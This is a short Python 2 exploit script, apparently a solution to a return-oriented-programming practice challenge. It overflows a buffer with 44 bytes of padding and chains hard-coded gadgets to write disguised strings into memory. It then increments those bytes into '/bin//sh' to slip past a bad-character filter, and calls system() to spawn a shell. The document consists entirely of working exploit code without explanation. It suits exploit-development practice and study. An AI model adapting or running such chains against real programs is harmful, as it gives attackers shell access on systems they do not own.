#!/usr/bin/python

import struct

# b i c / <space> f n s

write_loc = 0x804a048
write_lo2 = write_loc + 4
write_off = write_loc + 0x366fef3c

chain = "A"*44
chain += struct.pack('<I', 0x08048899)	# pop esi ; pop edi ; ret
chain += ".ahm"				# /bin changed to .ahm
chain += struct.pack('<I', write_loc) 	# address to write
chain += struct.pack('<I', 0x08048893)	# mov dword ptr [edi], esi ...useful gadget
chain += struct.pack('<I', 0x08048899)	# pop esi ; pop edi ; ret
chain += "..rh"				# //sh changed ..rh
chain += struct.pack('<I', write_lo2) 	# address to write to
chain += struct.pack('<I', 0x08048893)	# mov dword ptr [edi], esi ...useful gadget

for x in range(0, 7):
	chain += struct.pack('<I', 0x08048461)		# pop ebx
	chain += struct.pack('<I', write_off + x)	# offset location of /bin//sh	
	chain += struct.pack('<I', 0x080487a2)		# inc dword ptr [ebx - 0x366fef3c]

chain += struct.pack('<I', 0x080487b7)	# system
chain += struct.pack('<I', write_loc)  # address of /bin//sh
print chain
